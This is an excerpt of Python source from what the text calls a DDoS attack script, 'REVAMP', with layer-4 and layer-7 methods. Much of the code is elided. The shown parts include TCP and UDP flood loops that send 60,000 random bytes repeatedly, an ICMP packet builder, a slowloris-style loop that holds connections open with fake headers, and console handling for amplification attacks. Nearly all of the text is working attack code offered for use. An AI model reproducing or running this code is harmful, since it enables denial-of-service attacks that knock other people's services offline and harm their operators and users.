...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(60000)):
                continue
        Tools.safe_close(s)
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(60000), self._target):
                continue
        Tools.safe_close(s)
    ...
    def _genrate_icmp(self) -> bytes:
        ...
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1750)))
        ip.contains(icmp)
        return ip.get_packet()
        ...
        with suppress(Exception), self.open_connection() as s:
            ...
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 3500))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* REVAMP - DDoS Attack Script With %d Methods\n'
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Install bombardier: "
                        "https://github.com/Shelter/REVAMP/wiki/BOMB-method"
                    )
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method in Methods.LAYER4_AMP:
                    ...
                    logger.warning("https://github.com/Shelter/REVAMP/wiki/Amplification-ddos-attack")
